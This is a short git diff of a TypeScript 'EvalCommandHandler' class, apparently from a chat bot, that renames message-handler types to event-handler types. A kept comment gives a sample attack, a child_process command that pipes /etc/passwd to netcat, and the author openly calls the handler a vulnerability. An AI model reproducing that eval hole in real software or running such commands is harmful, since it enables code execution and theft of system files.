@@ -1,7 +1,7 @@
 import _ from 'lodash'
 import * as prettier from 'prettier'
 import { z } from 'zod'
-import { MessageHandlerReturnValue, ResponseReturningMessageHandler } from '../Router/MessageHandler'
+import { EventHandlerReturnValue, ResponseReturningEventHandler } from '../Router/EventHandler'
 
 const MAX_CODE_LINES_TO_PRINT = 50
 
@@ -16,8 +16,8 @@ const inputSchema = z.object({
  * `require('child_process').exec('cat /etc/passwd | nc ...')`
  * YES I KNOW ITS A VULNERABILITY
  */
-export default class EvalCommandHandler extends ResponseReturningMessageHandler<string> {
-  public async handle(): Promise<MessageHandlerReturnValue<string>> {
+export default class EvalCommandHandler extends ResponseReturningEventHandler<string> {
+  public async handle(): Promise<EventHandlerReturnValue<string>> {
     const validationResult = inputSchema.safeParse(this.input)
     if (!validationResult.success) {
       return { validationErrors: validationResult.error.errors }
